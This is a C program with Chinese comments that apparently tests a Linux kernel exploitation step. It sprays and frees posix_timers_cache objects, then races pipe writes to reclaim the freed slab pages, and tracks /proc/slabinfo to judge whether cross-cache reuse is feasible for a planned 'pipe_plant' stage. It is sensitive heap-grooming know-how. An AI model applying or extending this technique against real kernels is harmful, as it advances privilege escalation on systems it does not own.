/* 页级 reclaim 可行性验证（V5 前置）。
 *
 * 问题：pipe_plant 假设「受害者页刚被释放，紧接的 pipe write 能拿到它」。
 * 本程序直接检验这个假设，不涉及 rb_erase。
 *
 * 方法：
 *   1. 建 N 个 timer，记下它们的 slab 页地址（通过 /proc/slabinfo 间接看）
 *   2. 删除 timer -> free 进 RCU
 *   3. 立刻开 16 个 pipe，每个写 4KiB，内容带唯一标记
 *   4. 读回 pipe，检查内容是否被改动（说明被内核复用/写）
 *
 * 但用户态看不到内核页，所以改用「判据二」：
 *   用 slabinfo 的 slabs 数判断 200ms 后 page 是否真的回 buddy。
 *   如果 slabs 不降，说明页留在 slab 里没回 buddy，pipe 永远拿不到。
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

static void slab_line(const char *tag)
{
	FILE *f = fopen("/proc/slabinfo", "r");
	char ln[512];

	if (!f)
		return;
	while (fgets(ln, sizeof(ln), f)) {
		if (!strncmp(ln, "posix_timers_cache", 18)) {
			char a[5][64];
			int n = sscanf(ln,
				"%63s %63s %63s %63s %63s",
				a[0], a[1], a[2], a[3], a[4]);

			printf("[%s] active=%s total=%s objsize=%s per_slab=%s order=%s\n",
			       tag, n > 1 ? a[1] : "?",
			       n > 2 ? a[2] : "?", n > 3 ? a[3] : "?",
			       n > 4 ? a[4] : "?",
			       (strstr(ln, "2 :") ? "1" : "?"));
			break;
		}
	}
	fclose(f);
}

int main(int argc, char **argv)
{
	int N = argc > 1 ? atoi(argv[1]) : 4000;
	timer_t *ids = calloc((size_t)N, sizeof(timer_t));
	struct sigevent ev;
	int made = 0, i, wrote = 0;
	int pfd[32][2];
	size_t sz = 8u << 20;
	char *m;

	memset(&ev, 0, sizeof(ev));
	ev.sigev_notify = SIGEV_NONE;

	printf("=== 阶段 1: 填满 cache ===\n");
	slab_line("pre");
	for (i = 0; i < N; i++) {
		if (timer_create(CLOCK_MONOTONIC, &ev, &ids[i]))
			break;
		made++;
	}
	printf("made=%d\n", made);
	slab_line("post-create");

	printf("=== 阶段 2: 全部删除（free 进 RCU）===\n");
	for (i = 0; i < made; i++)
		timer_delete(ids[i]);
	slab_line("del+0ms");

	/* 关键：立刻抢页，不等 RCU */
	printf("=== 阶段 3: 立即开 pipe 抢页 ===\n");
	for (i = 0; i < 16; i++) {
		if (pipe(pfd[i])) {
			printf("pipe %d fail errno=%d\n", i, errno);
			break;
		}
		m = malloc(4096);
		if (m) {
			memset(m, 0xA5, 4096);
			if (write(pfd[i][1], m, 4096) == 4096)
				wrote++;
			free(m);
		}
	}
	printf("pipe wrote=%d\n", wrote);
	slab_line("after-pipe");

	usleep(200000);
	slab_line("200ms");
	usleep(1800000);
	slab_line("2s");

	printf("=== 阶段 4: 读回 pipe 检查是否被复用 ===\n");
	{
		int dirty = 0;

		for (i = 0; i < 16; i++) {
			if (pfd[i][0] <= 0)
				continue;
			{
				unsigned char rb[4096];
				ssize_t rn = read(pfd[i][0], rb, 4096);

				if (rn == 4096) {
					int k, all_a5 = 1;

					for (k = 0; k < 4096; k++)
						if (rb[k] != 0xA5) {
							all_a5 = 0;
							break;
						}
					if (!all_a5)
						dirty++;
				}
			}
		}
		printf("pipe pages modified = %d/16\n", dirty);
	}
	printf("=== 判据 ===\n");
	printf("1) 若 del+0ms 的 slabs 数与 post-create 相同，说明页没回 buddy，pipe 拿不到\n");
	printf("2) 若 200ms 后 slabs 明显下降，说明页回了 buddy，pipe 有机会\n");
	free(ids);
	return 0;
}